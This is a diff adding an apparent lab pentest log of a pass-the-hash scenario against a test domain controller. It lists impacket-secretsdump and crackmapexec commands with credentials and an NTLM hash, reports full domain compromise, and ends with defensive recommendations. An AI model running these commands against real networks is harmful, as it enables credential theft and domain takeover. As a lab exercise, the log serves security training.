@@ -1,0 +1,39 @@
+=== Scenario 5: Pass-the-Hash ===
+Date: 2026-06-12
+Objective: Authenticate to DC01 using NTLM hash without knowing the password
+
+Target Information:
+- Domain: lab.local
+- DC: DC01 (192.168.161.10)
+- Target Account: Administrator
+
+Attack Platform:
+- IP: 192.168.161.128
+- OS: Kali Linux
+- Tools: impacket-secretsdump, crackmapexec
+
+Phase 1: Hash Extraction
+- Command: impacket-secretsdump lab.local/Administrator:'P@ssword-'@192.168.161.10
+- Result: All NTLM hashes dumped successfully
+- Hashes obtained: Administrator, jsmith, sjones, mbrown, sqlsvc
+
+Phase 2: Pass-the-Hash
+- Command: crackmapexec smb 192.168.161.10 -u Administrator -H 6d8d01bbcbb00761c0091eb2a22799c0
+- Result: Pwn3d! - Successfully authenticated to DC01
+
+=== Summary ===
+Status: SUCCESS
+- All domain hashes extracted
+- Administrator authenticated using hash only
+- Full domain compromise achieved
+
+Key Findings:
+1. NTLM hashes allow authentication without password
+2. Once hash is obtained, password change is not enough
+3. All domain machines vulnerable to same attack
+
+Recommendations:
+- Enable Protected Users Security Group
+- Enable Credential Guard on Windows
+- Monitor Event ID 4624 (Logon) and 4648 in SIEM
+- Implement Least Privilege for all accounts
